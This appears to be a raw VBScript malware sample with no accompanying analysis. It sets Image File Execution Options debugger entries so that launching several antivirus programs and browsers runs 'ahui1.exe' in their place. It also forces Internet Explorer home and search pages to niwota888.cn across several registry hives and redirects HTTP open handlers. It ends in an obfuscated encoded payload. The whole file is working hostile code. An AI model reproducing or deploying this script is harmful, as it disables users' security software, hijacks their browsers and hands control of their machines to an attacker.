A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\clsmn.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\zjb.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WoptiUtilities_CN.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\computerz_cn.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Logo_1.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\arswp3.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\0nekey.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onekey.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\0nekey.tmp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\onekey.tmp\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Logo_1.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safebox.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safe.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kastray.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RSTray.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360SE.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\zhudongfangyu.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360tray.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360rp.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360sd.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\chrome.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SogouExplorer.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KWSMain.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KSWebshield.exe\Debugger","ahui1.exe","REG_SZ"
A.RegWrite"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\kwstray.exe\Debugger","ahui1.exe","REG_SZ"




Wscript.Sleep 2000 '0110

Set oShell = CreateObject("WScript.Shell")
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.niwota888.cn"


Wscript.Sleep 5000 '0110


Set oShell = CreateObject("WScript.Shell")
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Search_Url","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Search_Url","http://www.niwota888.cn"
oShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.niwota888.cn"
oShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Search Bar","http://www.niwota888.cn"
oShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Search Page","http://www.niwota888.cn"
oShell.RegWrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\SearchAssistant","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\Default_Search_Url","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\SearchAssistant","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Search\","http://www.niwota888.cn"
oShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Main\","http://www.niwota888.cn"
oShell.RegWrite "HKEY_CLASSES_ROOT\HTTP\shell\360SE.exe\command\","C:\Program Files\Internet Explorer\iexplore.exe %1"
oShell.RegWrite "HKEY_CLASSES_ROOT\HTTP\shell\SogouExplorer\Command\","C:\Program Files\Internet Explorer\iexplore.exe %1"
oShell.RegWrite "HKEY_CLASSES_ROOT\HTTP\shell\Maxthon2\command\","C:\Program Files\Internet Explorer\iexplore.exe %1"
oShell.RegWrite "HKEY_CLASSES_ROOT\HTTP\shell\TencentTraveler\command\","C:\Program Files\Internet Explorer\iexplore.exe %1"
oShell.RegWrite "HKEY_CLASSES_ROOT\HTTP\shell\open\command\","C:\Program Files\Internet Explorer\iexplore.exe %1"



Wscript.Sleep 120000 '0110
set ws=createobject("wscript.k D!xEZ=-	(gfrqj-kX/Dnh&y-^kUy4r^kUocO6DJSfBYE.n@#@&@#@&qd1DraYc?V+a~vZ!TPE!qqZ@#nY,h/{^.+mYW8Ln^D`Ehk^DbwO kt+ssr#@#dcD;	J;)-qqg9rq?w/H/Ons& 'qR^x3rSf~DEM+@#@&lvoqAA==^#